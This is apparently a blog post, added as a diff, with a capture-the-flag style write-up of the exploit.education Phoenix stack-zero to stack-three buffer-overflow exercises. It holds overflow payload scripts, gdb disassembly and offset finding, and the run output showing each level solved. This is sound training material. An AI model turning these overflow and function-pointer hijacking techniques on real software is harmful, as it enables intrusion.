@@ -1,0 +1,138 @@
+---
+layout: post
+title:  "Phoenix Stack0, Stack1"
+date:   2023-04-9 09:00:00 +1100
+categories: Journey
+tags: 
+---
+
+
+## Stack Zero
+```bash
+user@phoenix-amd64:/tmp$ echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS0123" | /opt/phoenix/amd64/stack-zero 
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed!
+```
+
+## Stack One
+```python
+buff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
+addr = "\x62\x59\x6c\x49" 
+print (buff + addr)
+```
+
+```bash
+user@phoenix-amd64:/tmp$ /opt/phoenix/amd64/stack-one AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPbYlI
+Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Well done, you have successfully set changeme to the correct value
+```
+
+## Stack Two
+```python
+buff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
+addr = "\x0a\x09\x0a\x0d"
+print (buff + addr)
+```
+
+```bash
+user@phoenix-amd64:/tmp$ export ExploitEducation=$(python test.py)
+user@phoenix-amd64:/tmp$ /opt/phoenix/amd64/stack-two
+Welcome to phoenix/stack-two, brought to you by https://exploit.education
+Well done, you have successfully set changeme to the correct value
+```
+
+## Stack Three
+```
+(gdb) disass main
+Dump of assembler code for function main:
+   0x00000000004006b5 <+0>:     push   rbp
+   0x00000000004006b6 <+1>:     mov    rbp,rsp
+   0x00000000004006b9 <+4>:     sub    rsp,0x60
+   0x00000000004006bd <+8>:     mov    DWORD PTR [rbp-0x54],edi
+   0x00000000004006c0 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
+   0x00000000004006c4 <+15>:    mov    edi,0x4007d8
+   0x00000000004006c9 <+20>:    call   0x4004f0 <puts@plt>
+   0x00000000004006ce <+25>:    mov    QWORD PTR [rbp-0x10],0x0
+   0x00000000004006d6 <+33>:    lea    rax,[rbp-0x50]
+   0x00000000004006da <+37>:    mov    rdi,rax
+   0x00000000004006dd <+40>:    call   0x4004e0 <gets@plt>
+   0x00000000004006e2 <+45>:    mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000004006e6 <+49>:    test   rax,rax
+   0x00000000004006e9 <+52>:    je     0x40071d <main+104>
+   0x00000000004006eb <+54>:    mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000004006ef <+58>:    mov    rsi,rax
+   0x00000000004006f2 <+61>:    mov    edi,0x400828
+   0x00000000004006f7 <+66>:    mov    eax,0x0
+   0x00000000004006fc <+71>:    call   0x4004d0 <printf@plt>
+   0x0000000000400701 <+76>:    mov    rax,QWORD PTR [rip+0x200418]        # 0x600b20 <stdout>
+   0x0000000000400708 <+83>:    mov    rdi,rax
+   0x000000000040070b <+86>:    call   0x400500 <fflush@plt>
+   0x0000000000400710 <+91>:    mov    rdx,QWORD PTR [rbp-0x10]
+   0x0000000000400714 <+95>:    mov    eax,0x0
+   0x0000000000400719 <+100>:   call   rdx
+   0x000000000040071b <+102>:   jmp    0x400727 <main+114>
+   0x000000000040071d <+104>:   mov    edi,0x400848
+   0x0000000000400722 <+109>:   call   0x4004f0 <puts@plt>
+   0x0000000000400727 <+114>:   mov    edi,0x0
+   0x000000000040072c <+119>:   call   0x400510 <exit@plt>
+End of assembler dump.
+(gdb) disass complete_level
+Dump of assembler code for function complete_level:
+   0x000000000040069d <+0>:     push   rbp
+   0x000000000040069e <+1>:     mov    rbp,rsp
+   0x00000000004006a1 <+4>:     mov    edi,0x400790
+   0x00000000004006a6 <+9>:     call   0x4004f0 <puts@plt>
+   0x00000000004006ab <+14>:    mov    edi,0x0
+   0x00000000004006b0 <+19>:    call   0x400510 <exit@plt>
+End of assembler dump.
+```
+
+We pack and overflow the buffer to find where we need to add new address to jump to:
+```python
+patt = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
+
+print (patt)
+```
+
+Location we need to replace is at the end of the stack with `QQQQRRRR`
+```bash
+(gdb) r < stack3
+Starting program: /opt/phoenix/amd64/stack-three < stack3
+Welcome to phoenix/stack-three, brought to you by https://exploit.education
+calling function pointer @ 0x5252525251515151
+
+Program received signal SIGSEGV, Segmentation fault.
+0x5252525251515151 in ?? ()
+```
+```
+>>> chr(0x51)
+'Q'
+>>> chr(0x52)
+'R'
+```
+
+Here we have `Buffer Filler` + `complete_level address` + `stack address of complete_level address`:
+```python
+buff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
+addr1 = "\x9d\x06\x40\x00\x00\x00\x00\x00"
+addr2 = "\x00\xe6\xff\xff\xff\xff\xff\x7f"
+print(buff+addr1+addr2)
+```
+
+What the stack looks like after buffer is filled and overflowed:
+```
+0x7fffffffe5b0: 0xffffe668      0x00007fff      0x00000000      0x00000001
+0x7fffffffe5c0: 0x41414141      0x42424242      0x43434343      0x44444444
+0x7fffffffe5d0: 0x45454545      0x46464646      0x47474747      0x48484848
+0x7fffffffe5e0: 0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
+0x7fffffffe5f0: 0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
+0x7fffffffe600: 0x0040069d      0x00000000      0xffffe600      0x7fffffff
+```
+
+As program runs, we hit line `0x0000000000400719 <+100>:   call   rdx`, `$rdx` => `0x7fffffffffffe600` => `0x000000000040069d` => `0x000000000040069d <+0>:     push   rbp`
+```bash
+/opt/phoenix/amd64/stack-three < stack3
+Welcome to phoenix/stack-three, brought to you by https://exploit.education
+calling function pointer @ 0x40069d
+Congratulations, you've finished phoenix/stack-three :-) Well done!
+```
